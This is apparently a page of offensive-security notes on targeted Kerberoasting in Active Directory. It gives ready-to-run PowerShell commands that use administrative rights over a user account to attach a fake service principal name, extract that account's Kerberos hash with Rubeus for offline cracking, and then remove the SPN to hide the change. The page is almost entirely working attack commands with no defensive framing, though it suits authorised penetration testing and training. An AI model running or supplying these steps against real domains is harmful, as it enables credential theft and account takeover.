---
description: >-
  If we have a lot of rights over user, we could make it vulnerable to
  Kerberoasting by MAKING her a service account so we can steal and crack hash.
  So Create SPN -> Steal&Crack Hash -> Delete SPN.
---

# Targeted Kerberoasting

## <mark style="color:yellow;">Creating Fake SPN's</mark>

```powershell
PS C:\> Set-DomainObject -Credential $Cred -Identity rmyers -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

## <mark style="color:yellow;">Kerberoasting via Rubeus</mark>

Rubeus is only as example, obviously you can use whatever you want.&#x20;

```powershell
PS C:\> .\Rubeus.exe kerberoast /user:rmyers /nowrap
```

## <mark style="color:yellow;">**Removing the Fake SPN**</mark>

```powershell
PS C:\> Set-DomainObject -Credential $Cred -Identity rmyers -Clear serviceprincipalname -Verbose
```
